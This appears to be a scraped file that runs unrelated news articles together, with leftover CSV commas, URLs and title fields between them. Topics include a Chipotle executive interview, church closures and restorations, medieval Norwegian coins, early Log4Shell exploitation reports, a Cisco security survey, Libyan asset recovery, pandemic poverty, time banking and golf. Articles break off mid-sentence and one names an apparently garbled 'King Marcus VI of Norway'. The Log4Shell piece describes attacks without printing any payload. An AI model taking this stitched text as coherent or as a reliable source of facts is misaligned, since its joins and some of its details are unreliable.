One of the biggest things that we do for the small farmer is we give them multi-year contracts so they know that if they create the field to be organic for use growing let’s say cilantro they know they have got a big buyer for years to come. They don’t want to turn a field to be organic cilantro only to find out now what do I do with this organic cilantro? It’s a big risk for them. So these multi-year contracts we do the same thing with animals as we do on produce. If you raise the animal correctly or consistent with what we believe are the humane practices feed them correctly we will give you a long term contract on the other side. That’s really powerful for a young farmer—meaning they’re new to the industry. It’s also powerful for a farm that’s thinking about generationally transferring the farm.

We also support the national young farmers coalition. I think we’ve committed over $5 million to them recently. We do grants. If somebody wants to start a hog farm and they need a sow and they may not have the ability to get the money to get the sow that’s where we can support them accordingly and get them started. We support some of the academic programs that a lot of these folks take in order to become successful farmers. And I can’t remember there’s a bunch of degrees that we do as debt-free that are in the agriculture space so we really try. The goal here is if we say it’s important then we need to demonstrate that it’s important.

Chipotle recently pledged to cut carbon emissions by 50% by 2030. And that’s not only in the restaurants but also across the supply chain. How will that work?

This is obviously like working all the way back with ranchers on whether there’s a better way to raise cattle. Is there a better way to harvest the produce and transport the produce? Can we put distribution centers closer to farms? There are a lot of things we can be doing through the supply chain. Also are there different ways to provide energy in our restaurants? And one of things I love about our company is we’ve always been experimenting. We had a restaurant where we literally stuck a windmill on the roof to see if we could use wind power to supply the restaurant. It didn’t work.

But somebody was able to try it?

Yeah to see what we can do. It’s easy to say we’re going to experiment learn and frankly be better. I found if you don’t make a target you don’t achieve the target. So that’s why we put it out there. We can’t just say we’re going to be better. We got to have a target for how much better we’re going to be.

How are you making sure the entire company is working toward these targets?

The climate-based targets are part of the bonus structure as well. Just like the food I was talking about. And then the third thing that’s part of it is equity and pay as well as ensuring that we’ve got an inclusive yield meaning everybody is growing in our organization. So you go from manager to field leader field leader to TD. We want it to be representative of the diversity we have as we move up to the organization. So all three of those. So you got people climate and food are tied to our bonus.

How are you setting targets related to diversity?

We operate everywhere around the country and the diversity of our work force represents usually the region that we’re in. And so we want to make sure the diversity of that workforce grows with us. So if you add field leaders team directors executive team directors we want that to continue to be representative of the part of the region that we’re operating in. So we monitor that as well.

Lately many American workers have been asking for—and getting—raises. What’s been Chipotle’s experience with that over the last year or so?

We’ve always been a leader in compensation especially at the entry level spot so we took a look back in I guess it was like March April and the [labor] market was really tight. We weren’t getting the hires that we wanted to get. And so we said benefits are great the growth opportunity is great. But you know what? They’ve got to have the right wage to get them started. And so we took up our average hourly wage to $15 across the company and for the starting job. It’s something frankly that we used to look at on a six month cycle and now we’re looking at it on a week to week basis market by market because in this inflationary environment you’ve got to recognize what you’re dealing with. And so luckily we have the pricing power to complement our need if we need to pivot on other cost elements. Whether that’s wages or buying produce.

Are there places where you’ve had to look at bringing the starting wages up beyond $15 per hour?

Yeah we already do that. There are parts of the country where the starting wages are $18 $19 an hour.

Are there practices that you’ve put in place during the pandemic that you think you’ll keep around because it just makes more sense and works really well?

Yeah. I would say the thing that we’ll probably keep in place is the monthly communication. I hope the market’ll be a little bit more stable where we’re not having to look at so many elements from wages to the cost of chicken on a two to four week basis. But I definitely think one thing I’ve learned is that as a company that’s growing as fast as we are we can’t communicate enough. And we won’t be doing obviously the twice a day conversations but this monthly cadence of connecting with all of our restaurant general managers is something that we’re going to stay with. It just works. It’s not working because we’re in a pandemic it works because it’s a good practice. It’s a really good practice.

What are those meetings like? Like you’re all on one big Zoom and people are chiming in asking questions?

The way I think about it is we set aside an hour. We usually have 20 to 35 minutes where we’re speaking. And then we leave the rest of the time for Q&A. Some of it is live and others are… we allow people sending questions ahead of time too. And I’ll tell you I think the last 20 or 30 minutes where you have the dialogue on the questions at hand is the most valuable piece of this.

It seems like you can really get a feel for what’s happening on a local level that way.

Totally. I’d like to try and get out every week and get to a certain part of the country to go visit a couple restaurants. But it’s just that. It’s a couple restaurants and we have 3000 restaurants versus I have all these folks on the phone or on [video-conference]. And what you find out is one person says it and like a bunch of people in the chat say yeah me too. Me too. And then you’re like OK we do have something here to address. And that dialogue is invaluable.

We’re almost at the end of 2021 and I’m wondering if you have any predictions for the coming year. What are your thoughts about 2022 right now?

I believe there’s going to be opportunities that we’re not aware of yet. I think there’s going to be more tailwind than headwind in ’22. And I believe our company’s positioned really well to take advantage of it for the benefit of our employees and our customers. There’s a lot of challenges that we’re going to be dealing with but I’m optimistic we’re going to get through it and I think we’ve demonstrated just how resilient our company is and just how resilient our people are.

On the topic of food do you have anything new coming to Chipotle’s menu in 2022 that we should be on the lookout for?

I’ll tell you we’ve got this plant-based chorizo that we just finished testing. We haven’t nailed down when we’ll launch it nationally but it performed well in tests. If you’re a queso con carne person put some of this plant-based chorizo into that queso. Oh my gosh man.",,,,,,,,,,,,

""Theologians are like the scouting party sent by Joshua to explore the land of Canaan"" in the Book of Numbers; ""they are charged with finding the right paths toward the inculturation of the faith"" Francis wrote in a message he handed to members of the International Network of Societies for Catholic Theology May 10.

The network which includes the Catholic Theological Society of America and similar groups around the world promotes collaborative research projects by theologians from different cultures and encourages dialogue with scholars from other churches other religions and various scientific disciplines.

In his prepared text Francis told members of the group that theology is ""a significant and necessary ecclesial ministry"" because ""it is part of our Catholic faith to explain the reason for our hope to all those who ask.""

Our Lady of Lourdes Church 4640 N. Ashland Ave. will host its last Mass May 19 as the parish is set to merge with St. Mary of the Lake in Buena Park.

That merger has been opposed by some supporters of Our Lady of Lourdes who hope to protect the 108-year-old church from demolition by landmarking it. They then plan to buy the church campus from the Archdiocese of Chicago so they can reopen it.

The group launched a nonprofit Our Lady of Lourdes Preservation Society to further its efforts.

“We’ve seen time and time again remarkable religious buildings sold to the highest bidder and often times undermined and demolished” said Ward Miller executive director of Preservation Chicago which is supporting the parishioners. “We have to save these kinds of buildings honor their stories and honor the communities and people that built them.”

If organizers can landmark and buy the church they plan to reopen it as a historical shrine said Maricelle Garcia vice president of Our Lady of Lourdes Preservation Society. They would also restore the church’s community programs like its food pantry and immigrant services and would convert the rectory into a bed and breakfast to fund maintenance Garcia said.

The group is already working with a few donors and plans to continue fundraising so it can create an endowment to preserve the church.

“We’ve been told that we need to find ways to sustain this financially and we can do it through our donors income-generating projects and through our fundraising” Garcia said.

Organizers are asking neighbors to reach out to Ald. Matt Martin (47th) to ask him to request a landmark designation for Our Lady of Lourdes Church.

Martin is “receptive to preservation goals” and working to facilitate a conversation between the nonprofit and the archdiocese said Lucy Nye director of developmental and business affairs at the 47th Ward office. The alderman is also speaking with preservationists to “make sure they understand what they would need to be able to purchase the building from the Archdiocese and maintain the building for the long” Nye said.

“Ald. Martin supports the preservation of Our Lady of Lourdes church building” Nye said in a statement. “Our priority is to ensure that the building is put to productive use to guarantee that the structure is cared for and maintained in the long term which requires adequate funding and organization.”

Our Lady of Lourdes merged with Buena Park’s St. Mary of the Lake in 2021 as part of the archdiocese’s effort to consolidate church resources. Since then Our Lady of Lourdes’ school building has been sold to developer Honore Properties who will turn the building into 42 apartments.

After the final Mass at Our Lady of Lourdes future celebrations will be held at St. Mary of the Lake 4220 N. Sheridan Road. All sacred items will be brought there as well according to a February announcement from church leadership.

The nonprofit has not yet approached the pastor or archdiocese to ask about buying the church said Susan Thomas spokesperson for the Archdiocese of Chicago. Thomas said Mass attendance at Our Lady of Lourdes “steadily dropped” in the past few years.

Of the 85 people who attend English Mass 65 percent expressed interest in attending Mass at St. Mary of the Lake while 92 percent of the 300 parishioners who attend Spanish Mass agreed to shift parishes as well Thomas said.

“The archdiocese’s Renew My Church team has identified that in order for a church site to be viable it needs an average participation of 800 people every Sunday to support vibrant ministries” Thomas said in a statement. “This is a very difficult moment but the parish life cannot end when a church building closes. The staff is committed to the spiritual well-being of all parishioners who worship at St. Mary of the Lake and Our Lady of Lourdes Parish.”

Our Lady of Lourdes held its first Mass in October 1892 on the southwest corner of Ashland and Leland avenues.

When the city widened Ashland Avenue in 1929 a team of 50 men and horses lifted the 10000-ton church from its foundation and moved it across the street according to Open House Chicago’s website. Once it was moved crews rotated it 90 degrees cut it in half and added a 30-foot expansion in the middle.

“This church has a lot of historical significance both architecturally and spiritually” said Katarina Garcia president of Our Lady of Lourdes Preservation Society. “Some people who’ve prayed in the grotto have gotten their miracles.”

People travel from all over the world to see the grotto at Our Lady of Lourdes in Uptown said Maria Precious Deang treasurer of the nonprofit and former church staff member. It’s a replica of the famous Grotto of Our Lady of Lourdes in France which is a cavernous holy site for Catholics.

The grotto is one of the only perpetual adoration sites in the area. In 1992 the Uptown church’s grotto was opened 24/7 as a place of worship but its hours were reduced when the church merged with St. Mary of the Lake. The grotto will be closed along with the church May 19.

“We have people from all over the world and of all different religions who come” Deang said. “Especially in these days with all that’s going on in the world people need a place to come for refuge. They need a place where they feel secure no matter what religion or nationality they are.”

Before the Reformation these brightly-coloured depictions of Christ’s judgement were common.

They allowed illiterate worshippers to understand that sinning meant a journey to Hell but righteousness meant eternal life.

During the 16th century they were considered a bit too Popish and the vast majority were plastered over or destroyed.

Now at the rural St Mary’s church in Woodham Ferrers near Chelmsford Essex a newly completed Doom painting can be seen.

It was based on the traces of the original that decorated the chancel arch and following close examination of those Doom paintings that remain.

The name Doom is derived from dom an old English word for judgement.

Using authentic pigments gold leaf and brushes made from hog and squirrel hair Steve Lawes a medieval art expert painted a version of the original.

Like most Doom paintings it is a representation of the Last Judgement at Christ’s second coming as described in Matthew 25:

“When the Son of Man comes in his glory and all the angels with him he will sit on his throne in heavenly glory.”

The painting depicts the righteous climbing from their graves to eternal life and the unrighteous – including a clergyman and king – departing to their eternal punishment.

Other features include the Apostles without Judas a citadel representing heaven and the jaws of Hell. Christ bleeding from the nails and with a gaping wound in his side is flanked by his mother Mary and John the Baptist.

Steve said: “The church’s original Doom it is thought was painted in the 1420s or 1430s and was plastered over during the Reformation.

“The Victorians uncovered it in 1884 but since then it has suffered further and it is now hard to discern.

“So it was a genuine thrill to be asked to recreate it using traditional techniques. A great deal of research had been done on the original with regard to the pigments used.

“And with the knowledge gained from examining the country’s more complete paintings I was able to interpret the Woodham Ferrers’ version.

“It is not as big as the original but I hope it captures the colour and drama and that it provides a sense of what worshippers would once have been looking at as they attended services.

“We are not used to our churches being decorated with bright coloured paintings but it was once common.”

Nia McIntosh a heritage consultant using money from the National Heritage Lottery Fund has overseen a wide Heritage Hub project at St Mary’s.

She said: “The original Doom has been through a lot over the years. It was damaged in a storm in 1989 and has deteriorated further despite conservation interventions.

“It’s now very hard to see which was why we wanted to find out what it had looked like originally and create a new version. We were able to with money from the Friends of Friendless Churches.

“My desire was to bring the painting to life for our visitors and congregation; to create more of an immersive experience and transport people back to the medieval period.

“Steve is an expert in this area and he examined the parts that remain of the original and studied documentary evidence from examinations since it re-emerged in 1884.

“Tests were done on the remaining paint to establish exactly what pigments were used and examination into extant Dooms enabled an interpretation which is as close as we can get.

“I’m sure there hasn’t been a Doom painting using traditional techniques created for a parish church since the Reformation.

“St Mary’s has other medieval paintings and decorations and we are currently hosting an exhibition and events to celebrate it.”

The exhibition Doom and discovery; wall paintings in the medieval church runs until the middle of June.

What started as an innocent childhood adventure led to a discovery that would take nearly six decades to reveal its true significance.

Childhood Games Historic Finds

It was a different time when Jan and his brother crawling through the spaces dug by Nazi soldiers during World War II to store ammunition stumbled upon what they thought were just cool trinkets to enhance their playtime. Among these were 14 silver coins an amber bead and nine needles all found in a setting that couldn’t be further from a typical playground.

Little did they know their ‘playthings’ were genuine artifacts. The coins safely tucked away in a small yellow Kodak slide box were forgotten as the brothers grew up only to be rediscovered by Jan in November 2023 nearly 60 years later. This prompted him to report the find to the local authorities in Møre og Romsdal County.

A Treasure Dating Back to the Middle Ages

The coins weren’t just old; they were ancient. Preliminary analysis by archaeologists suggested these pieces dated back to the Middle Ages. “We were just kids doing a treasure hunt under the church not realizing how rare these coins were” Jan shared. This sentiment echoed a childlike wonder akin to a poignant scene from the film Amélie where childhood treasures hold emotional value only in Jan’s case these items held substantial archaeological value as well.

Carl-Fredrik Wahr-Hansen Vemmestad the county archaeologist identified that some coins might date back to around 1280 during the reign of King Marcus VI of Norway. Others could be a bit more recent from the time of King Christian I who ruled from 1450 to 1481. “Such finds are extremely rare as there are literally only a handful of these coins that have survived to this day in central Norway” explained Vemmestad.

More Than Just Coins

The seemingly mundane items found alongside the coins also turned out to be historically significant. The needles were dated to the 13th century likely part of a garment belonging to a deceased individual while the amber bead might have come from a prayer crown used by priests and deacons.

Following the guidelines of Norway’s archaeological preservation policy which states that all artifacts found that were made before 1605 are considered state property unless owned privately before 1905 Jan handed over his childhood treasures to the local authorities. These artifacts are now slated for preservation and may even be displayed to the public.

In a twist fit for the movies what Jan and his brother saw as simple elements of childhood games turned out to be treasures of a nation preserving a slice of history beneath the floorboards of a quiet church. This story not only highlights the unexpected corners where history can lurk but also reminds us of the pure joy of discovery a feeling that doesn’t fade even after 60 years.",https://news.google.com/articles/CBMiaGh0dHBzOi8vd3d3Lnd0dm0uY29tLzIwMjQvMDUvMTAvbXQtb2xpdmUtYmFwdGlzdC1jaHVyY2gtcGl0dHN2aWV3LWFsLWJ1cm5zLWRvd24tYWZ0ZXItYW4tb3Zlcm5pZ2h0LWZpcmUv0gF3aHR0cHM6Ly93d3cud3R2bS5jb20vMjAyNC8wNS8xMC9tdC1vbGl2ZS1iYXB0aXN0LWNodXJjaC1waXR0c3ZpZXctYWwtYnVybnMtZG93bi1hZnRlci1hbi1vdmVybmlnaHQtZmlyZS8_b3V0cHV0VHlwZT1hbXA?hl=en-US&gl=US&ceid=US%3Aen,Mt. Olive Baptist Church in Pittsview AL burns down after an overnight fire,"PITTSVIEW Ala. (WTVM) - In Pittsview Alabama a pastor is now without his church after it was burned down in an overnight fire. The church is believed to have been struck by lightning.

We went to Mount Olive Baptist Church where there was still smoke from the fire. Officials say the church was around 200 years old and some members had gone to the church for as long as 50 years.

We spoke with Reverand Eugene Brown who has been the pastor at Mount Olive for the last 8 years.

He said the group’s faith is still strong despite seeing their beloved church in ashes.

“The building is destroyed but We are still here because we are the true church of God not the building and we can worship anywhere” said Brown.

No injuries were reported at the church on Continuation Street in Pittsview - there have also been no announcements for rebuilding.

""Earliest evidence we've found so far of #Log4J exploit is 2021-12-01 04:36:50 UTC"" Cloudflare CEO Matthew Prince said on Twitter.

""That suggests it was in the wild at least 9 days before publicly disclosed. However don't see evidence of mass exploitation until after public disclosure.""

Cisco Talos said in a blog post that it observed activity for the vulnerability known as CVE-2021-44228 from December 2 and those looking for indicators of compromise should extend their searches to at least that far back.

Thanks to the ubiquity of the impacted library Talos said it was seeing lead time from attackers doing mass scanning to callbacks occurring and could be due to vulnerable but non-targeted systems -- such as SIEMs and log collectors -- being triggered by the exploit.

It added that the Mirai botnet was starting to use the vulnerability. Researchers at Netlab 360 said they had seen the Log4j vulnerability used to create Muhstik and Mirai botnets that went after Linux devices.

Over the weekend vendors have been rushing to get patches out and document workarounds for affected products. The end results have been product matrices such as those from VMware and Cisco where some products have patches available some have workarounds and others remain vulnerable. Both vendors scored CVE-2021-44228 as a perfect 10.

The suggested workarounds typically either set the log4j2.formatMsgNoLookups flag to true or remove the JndiLookup class from the classpath used by Java.

A Reddit post from NCC Group is being regularly updated and shows how the exploit can be used to exfiltrate AWS secrets as well as all manner of Java system properties.

One security researcher was able to trigger the exploit by going Little Bobby Tables on his iPhone name.

Sophos said it was seeing the vulnerability already being used by cryptominers.

On the more enjoyable front a Minecraft mod developer was able to use the vulnerability to turn a Minecraft server into one that played Doom instead.

""For some context this is an entirely vanilla client connecting to a modded server which through this exploit is sending over and executing the code to run doom"" Gegy said.

Microsoft threat analyst Kevin Beaumont said defence in depth was ""probably your best option"".

""To give a spoiler for Log4Shell this is going to take weeks to play out to establish attack surface (it is large) and then maybe a month or more for patches to be made available"" he said.

Findings of Cisco’s Security Outcomes Study showed 35 percent of cybersecurity technologies used by Philippine companies were considered outdated by security and privacy professionals working at these organizations.

MANILA Philippines — Companies in the Philippines need to refresh the technologies and solutions in their cybersecurity infrastructure as more than a third of the cybersecurity technologies they use are considered outdated a new study by Cisco showed.

Findings of Cisco’s Security Outcomes Study showed 35 percent of cybersecurity technologies used by Philippine companies were considered outdated by security and privacy professionals working at these organizations.

Cisco said 52 percent of the respondents from the Philippines also consider their cybersecurity infrastructure as complex.

The tech giant however said the good news is that Philippine companies are investing in modern cybersecurity technologies and approaches to address complexities and improve their security posture.

Some 90 percent of respondents in the Philippines said their companies are investing in “zero trust” strategy with 51 percent saying their organizations are making steady progress in adopting it and 39 percent saying they are at a mature state of implementing it.

In addition 87 percent of the respondents said their companies are investing in Secure Access Service Edge architecture with 46 percent saying they are making good progress and 41 percent saying their implementation of SASE is at mature levels.

Cisco said the two approaches – zero trust strategy and SASE – are key to building a strong security posture for companies in the modern cloud-first and application-centric world.

SASE combines networking and security functions in the cloud to deliver secure access to applications anywhere users work while zero trust is a concept that involves verifying the identity of each user and device every time they access an organization’s network to reduce the security risk according to Cisco.

“Businesses across the globe including here in Philippines have seen a huge change in their operating models driven in large part by the pandemic” said Kerry Singleton managing director cybersecurity Asia-Pacific Japan and Greater China at Cisco.

“As they grapple with changes like a distributed workforce and digital-first interactions it is imperative for them to be able to connect users seamlessly to the applications and data they need to access in any environment and from any location. They need to achieve this while being able to control access and enforce the right security protection across networks devices and locations” Singleton said.

Cisco’s latest study is based on a global survey of more than 5100 security and privacy professionals across 27 markets. This includes more than 2000 professionals from 13 markets in Asia-Pacific.

Cisco said the study aims to determine the most impactful measures teams can take to defend their organizations against the evolving threat landscape.

Respondents including professionals from companies in the Philippines shared their approaches to updating and integrating their security architecture detecting and responding to threats and staying resilient when disaster strikes.

“In today’s digital led business environment companies need to ensure they stay ahead of the curve when it comes to cybersecurity.

In its filing Thursday in Manhattan federal court the Libyan Asset Recovery and Management Office (LARMO) says that JPMorgan Chase & Co. Citigroup Inc. and six other large banks may have information about the money Qaddafi his family and associates stole.

According to LARMO the accused transferred the money through Bank of America Corp. UBS Group AG HSBC Holdings PLC Credit Suisse Group AG Bank of New York Mellon Corp. Deutsche Bank AG. and Citi and JPMorgan.

The agency estimates that at least tens of billions of dollars worth of assets that Qaddafi and his agents stole remain missing.

In a statement Thursday Larmo legal team said that effort could become the largest international asset recovery in history.

LARMO was set up in 2017 with UN and EU support to recover stolen Libyan assets during Qaddafi’s era. The agency says its goal is to track down money looted through corrupt business deals and embezzlement of government funds.",,,,,,,,,

More than half a billion people globally were pushed into extreme poverty last year as they paid for health costs out of their own pockets during the height of the COVID-19 pandemic according to the World Health Organization and the World Bank.

The pandemic disrupted health services globally and triggered the worst economic crisis since the 1930s making it even more difficult for people to pay for healthcare a joint statement from the two organisations said on Sunday.

“All governments must immediately resume and accelerate efforts to ensure every one of their citizens can access health services without fear of the financial consequences” WHO Director-General Tedros Adhanom Ghebreyesus said.

Tedros urged governments to increase their focus on healthcare systems and stay on course towards universal health coverage which the WHO defines as everyone getting access to health services they need without financial hardship.

Healthcare is a significant political issue in the United States one of the few industrialised countries that does not have universal coverage for its citizens.

Globally the pandemic made things worse and immunisation coverage dropped for the first time in 10 years with deaths from tuberculosis and malaria increasing.

“Within a constrained fiscal space governments will have to make tough choices to protect and increase health budgets” Juan Pablo Uribe global director for health nutrition and population at World Bank said.

Out of the middle class

According to a Pew Research Center study published in March the pandemic has driven 32 million Indians out of the middle class defined as those earning $10 to $20 a day.

It estimated the crisis has increased the number of India’s poor – those with incomes of $2 or less a day – by 75 million.

Meanwhile a new report published on Thursday by the United Nations Children’s agency (UNICEF) said that 100 million additional children were estimated to now be living in multidimensional poverty because of the pandemic a 10-percent increase since 2019.

Henrietta Fore the UNICEF’s executive director said the widespread impact of COVID-19 continues to deepen increasing poverty entrenching inequality and threatening the rights of children.

“While the number of children who are hungry out of school abused living in poverty or forced into marriage is going up the number of children with access to health care vaccines sufficient food and essential services is going down. In a year in which we should be looking forward we are going backward” she said.",https://news.google.com/articles/CBMiNGh0dHBzOi8vYXJtb25leWFuZHBvbGl0aWNzLmNvbS9hbXAtcG93ZXItd29tZW4tMjAyMS_SAQA?hl=en-US&gl=US&ceid=US%3Aen,Power Women 2021 - AMP,"Power Women 2021

There would be eight units built in a two-story addition atop the building at 40 Adams St. which now houses a Citizens Bank branch. A new four-story building with another 45 apartments would be built behind it at what is now a parking lot for commuters. The apartments would be a mix of studios one- and two-bedroom units. The buildings would be linked by enclosed walkways and there would be a path from the new building to Adams Street.

Chuck Hajjar a local real estate manager outlined the proposal during a meeting with the select board Wednesday night.

""So far we've had a lot of positive feedback"" Hajjar said the proposal.

Architect Derek Rubinoff who designed the proposed building said the design features a lot of red brick to blend in with other buildings in the Milton Village area such as the Walter Baker complex. It also matches the height of other buildings in the area and features some modern touches of glass and metal.

The exterior of the bank building is already undergoing renovations that will match the development.

The area below the new building would be converted into tenant parking and Hajjar said that one of the things the MBTA wants the developer to do is replace 20 to 25 commuter parking spaces nearby.

Hajjar said he would need some help from the town in relocating the parking.

He said he would also be willing to repair the closed stairway which leads from Adams Street to Milton station platforms. The stairway has been closed due to its deteriorating condition.

Select board chair Katie Conlon said she would like to see more red brink and less modern elements in the design of the building in keeping with the area.

""Hopefully it will lead to further development in Milton Village"" she said.

Hajjar said he plans to continue talks with the MBTA about acquiring the site and will have further discussions with the town.

A proposal that will go before the Feb. 28 special town meeting would ask the state for an additional liquor license for a brewpub that would be part of a redevelopment of 1 Eliot St. across the street from Hajjar's proposed development.

As a philosophy this is both simple and noble in its conception and is based on altruistic principles harking back to a simpler time.

In essence individuals offer their time (at no charge) to others. This contribution is logged in their account and available to them as a credit to avail in their times of need.

In its purest form Time Banking values every individual (and their time) equally makes “giving of personal time” a tradeable commodity increases mutual respect and thereby builds a self-sustaining community instead of selfish individuals.

One of the more successful attempts at practical implementation of this concept was seen in the Swiss city of St. Gallen (population ~75000) where healthy and caring volunteers with good communication skills looked after elderly people and were able to “deposit” the time they spent into their personal account of the social security system.

Over time as the volunteer himself/herself got old and was in need of assistance he/she could withdraw the hours that they had in their account and could depend on the social service system to assign them a volunteer.

India too has had well-meaning citizens make an effort in this direction with the first Time Bank of India making its debut in 2019.

A sub-committee within the National Human Rights Commission (NHRC) has also recommended that India test a pilot project supported by the Ministry of Social Justice and Empowerment.

That said true value of any noble intentions or concept lies in its implementation and success in the real world.

What is evident from the various experiments around the world is that the truism of “time is money” cannot be ignored. Hence volunteers who are happy to contribute time for such an initiative need to come from a background or have a social support structure where they no longer need to use their time to generate money for themselves and their families.

In countries where people are at an age or stage of their lives where they have to strive hard to provide a better standard of living for their families and the best possible education for their children the ability and desire to “bank” time for a return in kind at some future date while noble in its endeavour and thought loses to the more immediate concerns of daily life.

In the more developed countries that have a well-developed and robust social security system and where elderly individuals need company and companionship such an experiment has worked well with young pensioners banking time to help and support older pensioners.

The young pensioners in these countries can depend on the state to support their financial and medical needs and are hence able to contribute their time to the benefit of their elders secure in the knowledge that they too will be beneficiaries of the time they accumulate in their personal accounts.

India is adding 4.5 million senior citizens to its population every year. By 2050 20% of the country will be above the age of 60. The rapid nuclearization of families improved education and job opportunities longer life expectancy means more and more seniors are living alone as their children pursue their careers across the world.

What India needs is a solution that encourages seniors to live in a community environment where all their needs of daily living are looked after their immediate and emergent medical needs can be addressed and where social interaction acts as a bulwark against ageing allowing them to remain healthier for longer.

Senior living communities are the best solution to this need. Where the country and our seniors need support from the government is through policy and legislation whereby such services are available to all who seek it across all price points.

While the middle class can afford these services from their accumulated savings many elders will depend on their children’s support to get them access to the care and support they need – especially when the children are themselves unable to be personally present to provide this.

In such a case children must appreciate and fulfil their responsibilities to their parents. The COVID-19 pandemic laid cruelly bare the dependency senior citizens living on their own have on external resources to assist them with activities of daily living.

The Maintenance and Welfare of Parents and Senior Citizens (Amendment) Bill 2019 is a step in ensuring that there is a remedy available to society and elders. Tabled for approval in this session of Parliament the Bill introduces several changes to the Maintenance and Welfare of Parents and Senior Citizens Act 2007.

The Amendment Bill widens the definition of “children” to include adoptive children and children-in-law as also the legal guardians of minor children. Similarly the definition for “parents” now includes parents-in-law and grandparents as well.

The earlier definition of maintenance under the Act included the provision of food clothing residence medical attendance and treatment. This has been expanded to include the provision of healthcare safety and security for parents to lead a life of dignity.

Most importantly the amendment will remove the cap of Rs. 10000 per month as the maintenance charge. Tribunals will now have the liberty to fix this charge based on the standard of living of the parents and the earnings of the children to ensure that seniors are able to enjoy the dignity they deserve.

One hopes that the legislation and the initial rulings will send an unequivocal message to children that the state will stand by the seniors and ensure that children are fair and considerate in fulfilling their responsibilities.

Time banking on the other hand has the potential to succeed in environments where individuals have fulfilled their responsibilities to their families and where the urge and urgency to translate personal time into money is no longer a factor.

Senior living communities where all residents realise the value of their time and support to friends and neighbours is an ideal place to use this tool to bind residents in ties of mutual support.

But their 23-under total tied Thompson's best in her five appearances in Greg Norman's PGA Tour event. Thompson had tied for fourth while playing with Tony Finau in 2017 but they had shot 21 under; the two shot 23 under the next year and were seventh.

""You're welcome"" Watson joked. ""Michael Jordan's number.""

Thompson and Watson shot a 4-under 68 in the final round which uses a better-ball format. That meant Thompson had to play her own ball from the same tee as all 23 male players roughly 900 yards further than the Tiburón Gold Course layout she played in the LPGA's Tour CME Group Tour Championship a few weeks ago.

""The experience was great"" Watson said. ""Today I just didn't have it. This is the first time I guess counting the pro-am playing five days in a row in 3 1/2 months. She played unbelievable. I couldn't ask for a better partner. She putted phenomenal. She hit a lot of amazing shots even playing those tees. Even today playing her own ball she hit so many great shots.

""I couldn't ask for a better partner but she could -- I didn't make that many birdies today.""

Thompson had played with Bryson DeChambeau in 2016 and Finau in 2017 and 2018 and Sean O'Hair two years ago. She wasn't able to play in last year's Shootout after the U.S. Women's Open was moved back due to the coronavirus pandemic and ended up being the same week.

Thompson and DeChambeau tied for 11th in 2016 and Finau and Thompson were seventh in 2018 following up their fourth-place finish the year before. O'Hair and Thompson were last in 2019.

""It was overall amazing"" Thompson said. ""I was so happy to be able to team up with (Bubba) this week. This week is so much fun growing up with older brothers just playing with the guys and playing from all the way back. But to be alongside Bubba always rooting me on helping me out and just feeding off each other as a team is an honor to be out there and we had a lot of fun doing it.""

Leaders go cold: Marc Leishman and Jason Day had a three-shot lead going into the final round of the QBE Shootout on Sunday. Then they extended it to four early at Tiburón Golf Club at the Ritz-Carlton Golf Resort.

And then they went cold.

The two Aussies made one birdie in an eight-hole stretch on the middle of the front nine and early on the back. By the time they made back-to-back birdies on Nos. 13 and 14 they were chasing eventual winners Jason Kokrak and Kevin Na.

""I mean just a little bit off I think"" Leishman said. ""Just cold putters. But Kevin and Jason they played some unbelievable golf. I don't even know what we shot. We just left too many shots out there and just couldn't get it going. In four-ball you have to see those putts drop in and we weren't able to do that.""

""We just didn't get the putter rolling today so kind of started from the get-go with me three-whacking off the front edge there"" Day said. ""Just didn't get any sort of momentum kind of rolling unfortunately.""

Day is still working on some swing changes to keep his back on which he had noninvasive surgery from bothering him.

""It's still not 100%"" Day said. ""Obviously every day I come off and I'm just a little bit in pain still because it's just not quite -- it's hard. Like I'm standing out there and I'm trying to get my left hip back and cover it with the ball I feel like it's going to go 50 left and then I kind of dump it back underneath which is the old move and it's no good for me.""

Burns Horschel bogey again: Sam Burns and Billy Horschel bogeyed in the modified alternate shot format Saturday and joked they'd be OK making another bogey in the final round if it meant a victory.

That nearly was the case.

The pair bogeyed the par-3 No. 5 but birded 10 of the last 11 holes to finish second at 32-under.

""Once again got off to a slow start like we did in the scramble format and once again we made another bogey as two professionals playing a best ball format so that's really solid"" Horschel said sarcastically. ""But other than that we got hot.""

Burns hit it tight on the 18th hole but Horschel holed out for birdie from near the water hazard.

""Billy stealing my thunder on 18"" Burns joked.

Horschel missed a birdie putt on No. 15 for the only par on the back nine.

""I missed a putt I think I've had five straight years and I missed it the same way every time"" Horschel said.

""We've got it in the book this time"" Burns interjected.

""We marked it in the book this time for next year"" Horschel followed up.

Defending champions just short: Harris English and Matt Kuchar said neither played all that well Sunday. Still they tied for third two strokes behind winners Jason Kokrak and Kevin Na.

So in seven appearances English and Kuchar have won three times finished second two times third one time and somehow in 2017 tied for 10th.

English had made an eagle on No. 17 to get them to 31 under one back of Kokrak and Na at the time but Kokrak birdied No. 18.

""It was a good run all things considered"" Kuchar said. ""I don't think either one of us were on our best form and I think we partnered up fairly well. There were a couple holes Harris was out that I was able to kind of hold on recover even make some birdies which was fun. And then Harris just kind of owns this back nine and put it on on the back nine. Really really kind of got us back in at least with a chance on the last hole.""

""We didn't have our A-game today I certainly didn't but he kept me in it"" English said. ""We had a chance down the stretch.""

syndrome"" is a term popularized on TikTok to describe self-centered out of touch people. Having main character energy typically means someone sees the people in their life as supporting actors in their movie.

Carrie Bradshaw from "" Sex and the City "" is the main character in more ways than one.

The character of Carrie is generally regarded in popular culture as a self-centered entitled person whose life needs to be the center of her friend s' attention. As the (arguably self-appointed) protagonist of her friend groups Carrie's problems and her relationships come first as her friends support her grinning and bearing it on the sidelines.

""Her neediness her self-obsession her insecurity and her immaturity – are all things that in the real world would have rendered her unable to retain relationships this long-standing with these women"" wrote Hannah-Rose Yee

for Body + Soul

But Carrie represents something that isn't reserved to the screen — it can affect anyone.

""'Main character syndrome' refers to identifying as the protagonist in your own life story"" Kate Rosenblatt therapist and senior clinical manager at Talkspace told Insider.

While ""main character syndrome"" isn't an actual mental health diagnosis it is generally defined — in pop culture and on TikTok — as someone who is self-centered believes the people around them live to support them and views themself as the main character of their life.

According to Rosenblatt and other experts there are three key red flags that can tell you if you inadvertently are the Carrie of your group:

Everything is about you and your problems

A surefire way to tell you have main character syndrome is taking a second to reflect on your relationships with people. If you see yourself as the center of attention and them as the supporting roles you might be exuding some main character energy.

Cynthia Catchings a therapist for Talkspace told Insider a person with main character syndrome often ""thinks or sees themself as someone they imagine or want to be like or is pretending to be the lead of their own story or self-created tale.""

That main character mentality can come with a ""sense of entitlement that"" leaves little room for them to provide emotional support to the people in their lives.
